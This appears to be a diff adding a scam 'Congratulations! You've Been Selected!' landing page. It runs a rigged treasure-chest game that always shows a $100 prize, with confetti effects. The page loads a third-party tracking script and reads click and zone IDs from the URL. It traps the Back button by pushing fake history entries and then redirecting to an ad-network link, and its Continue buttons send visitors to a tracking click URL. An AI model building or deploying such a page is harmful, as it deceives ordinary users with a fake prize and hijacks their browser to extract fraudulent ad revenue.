@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta name="robots" content="noindex,nofollow">
+        <script>
+        function getURLParameter(name) {
+            return decodeURIComponent(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+            );
+        }
+
+        let cost = getURLParameter('cost');
+        let clickId = getURLParameter('src_clid');
+        let zoneId = getURLParameter('zoneid');
+        let geo = getURLParameter('geo');
+        let cid = getURLParameter('cid');
+
+        </script>
+
+        <!--Optional, send client hints to get accurate device data-->
+        <meta http-equiv="delegate-ch" content="sec-ch-ua https://hozl1m.mcgo2.com; sec-ch-ua-mobile https://hozl1m.mcgo2.com; sec-ch-ua-arch https://hozl1m.mcgo2.com; sec-ch-ua-model https://hozl1m.mcgo2.com; sec-ch-ua-platform https://hozl1m.mcgo2.com; sec-ch-ua-platform-version https://hozl1m.mcgo2.com; sec-ch-ua-bitness https://hozl1m.mcgo2.com; sec-ch-ua-full-version-list https://hozl1m.mcgo2.com; sec-ch-ua-full-version https://hozl1m.mcgo2.com" />
+
+        <!-- MaxConv Tracking Script Base Code-->
+        <script>!function(w,d,o,n,c){w[o]=w[o]||function(){(w[o].q=w[o].q||[]).push(arguments)};var s=d.createElement(n),t=d.getElementsByTagName(n)[0];s.async=!0;s.defer=!0;s.src="https://hozl1m.mcgo2.com/t/t.js";t.parentNode.insertBefore(s,t);}(window,document,"maxconv","script");</script>
+        <noscript><link rel="stylesheet" href="https://hozl1m.mcgo2.com/t/t.css?mc_ns=1" /></noscript>
+        <!-- End MaxConv Tracking Script Base Code-->
+        
+        <script>
+            function sL0() {
+                setTimeout(function() {
+                    window.location = "https://rtjxt.com/link?z=9419981&var="+zoneId+"&ymid="+clickId;
+                }, 10000);
+            }
+        </script>
+        <script>
+            function sL1() {
+                // var image = document.createElement('img');
+                // image.src = '#';
+                // document.body.appendChild(image);
+                setTimeout(function() {
+                    window.location = "https://hozl1m.mcgo2.com/click/1";
+                }, 200);
+            }
+        </script>
+        <script>
+            var bbURL = "https://rtjxt.com/link?z=9419981&var="+zoneId+"&ymid="+clickId;
+            ! function() {
+                var t;
+                try {
+                    for (t = 0; 5 > t; ++t) history.pushState({}, "", "#");
+                    onpopstate = function(t) {
+                        t.state && location.replace(bbURL)
+                    }
+                } catch (t) {}
+            }();
+        </script>
+        <title>Congratulations! You've Been Selected!</title>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="style.css" type="text/css" rel="stylesheet">
+        <link rel="icon" type="image/webp" href="chest.webp" sizes="32x32">
+        <style type="text/css">
+            .goog-te-banner-frame,
+            .skiptranslate {
+                display: none !important;
+            }
+
+            body {
+                top: 0 !important;
+            }
+        </style>
+        <script src="jq.min.js"></script>
+    </head>
+    <body>
+        <div class="header">
+            <img class="logo" src="logo.png">
+        </div>
+        <div class="content">
+            <div class="inner">
+                <div class="intro">
+                    <h1>Congratulations!</h1>
+                    <p class="paragraph">You have a free chance to win now!</p>
+                    <p class="paragraph">Every month we select 10 users to win amazing prizes.</p>
+                    <p class="paragraph">Click on a treasure box and see if you win.</p>
+                    <div class="chests">
+                        <div class="chest">
+                            <img src="chest.webp" class="imgChest">
+                            <button class="button">Open it!</button>
+                        </div>
+                        <div class="chest">
+                            <img src="chest.webp" class="imgChest">
+                            <button class="button">Open it!</button>
+                        </div>
+                        <div class="chest">
+                            <img src="chest.webp" class="imgChest">
+                            <button class="button">Open it!</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="prize" style="display:none;">
+                    <h2>Congratulations!</h2>
+                    <a href="#" target="_blank" onclick="sL1();">
+                        <img src="prize.jpg">
+                    </a>
+                    <h2>
+                        <mark>Wow! Your are lucky!</mark>
+                    </h2>
+                    <p class="paragraph"> Open next page and claim your prize with earn your bonus. </p>
+                    <!-- <a href="#" target="_blank" onclick="sL1();" class="button">Continue</a> -->
+                    <a href="#" onclick="sL1();" class="button">Continue</a>
+
+                </div>
+            </div>
+            <div class="loader" style="display:none;">
+                <div class="loader__dual-ring"></div>
+            </div>
+        </div>
+        <canvas id="canvas" width="798" height="332"></canvas>
+        <script type="text/javascript">
+            let W = window.innerWidth;
+            let H = window.innerHeight;
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+            const maxConfettis = 150;
+            const particles = [];
+            const possibleColors = ["DodgerBlue", "OliveDrab", "Gold", "Pink", "SlateBlue", "LightBlue", "Gold", "Violet", "PaleGreen", "SteelBlue", "SandyBrown", "Chocolate", "Crimson"];
+
+            function randomFromTo(from, to) {
+                return Math.floor(Math.random() * (to - from + 1) + from);
+            }
+
+            function confettiParticle() {
+                this.x = Math.random() * W; // x
+                this.y = Math.random() * H - H; // y
+                this.r = randomFromTo(11, 33); // radius
+                this.d = Math.random() * maxConfettis + 11;
+                this.color = possibleColors[Math.floor(Math.random() * possibleColors.length)];
+                this.tilt = Math.floor(Math.random() * 33) - 11;
+                this.tiltAngleIncremental = Math.random() * 0.07 + 0.05;
+                this.tiltAngle = 0;
+                this.draw = function() {
+                    context.beginPath();
+                    context.lineWidth = this.r / 2;
+                    context.strokeStyle = this.color;
+                    context.moveTo(this.x + this.tilt + this.r / 3, this.y);
+                    context.lineTo(this.x + this.tilt, this.y + this.tilt + this.r / 5);
+                    return context.stroke();
+                };
+            }
+
+            function Draw() {
+                const results = [];
+                // Magical recursive functional love
+                requestAnimationFrame(Draw);
+                context.clearRect(0, 0, W, window.innerHeight);
+                for (var i = 0; i < maxConfettis; i++) {
+                    results.push(particles[i].draw());
+                }
+                let particle = {};
+                let remainingFlakes = 0;
+                for (var i = 0; i < maxConfettis; i++) {
+                    particle = particles[i];
+                    particle.tiltAngle += particle.tiltAngleIncremental;
+                    particle.y += (Math.cos(particle.d) + 3 + particle.r / 2) / 2;
+                    particle.tilt = Math.sin(particle.tiltAngle - i / 3) * 15;
+                    if (particle.y <= H) remainingFlakes++;
+                    // If a confetti has fluttered out of view,
+                    // bring it back to above the viewport and let if re-fall.
+                    if (particle.x > W + 30 || particle.x < -30 || particle.y > H) {
+                        particle.x = Math.random() * W;
+                        particle.y = -30;
+                        particle.tilt = Math.floor(Math.random() * 10) - 20;
+                    }
+                }
+                return results;
+            }
+            window.addEventListener("resize", function() {
+                W = window.innerWidth;
+                H = window.innerHeight;
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            }, false);
+            // Push new confetti objects to `particles[]`
+            for (var i = 0; i < maxConfettis; i++) {
+                particles.push(new confettiParticle());
+            }
+            // Initialize
+            canvas.width = W;
+            canvas.height = H;
+            Draw();
+        </script>
+        <script>
+            $('.imgChest, .chest button').click(function() {
+                $(this).closest('div').find('img').attr('src', 'prize.jpg');
+                $('.loader, canvas').show();
+                $(this).closest('div').find('button').text('$100');
+                setTimeout(function() {
+                    $('.intro, .loader, h1, canvas').remove();
+                    $('.prize').fadeIn();
+                }, 2000);
+            });
+        </script>
+    </body>
+</html>
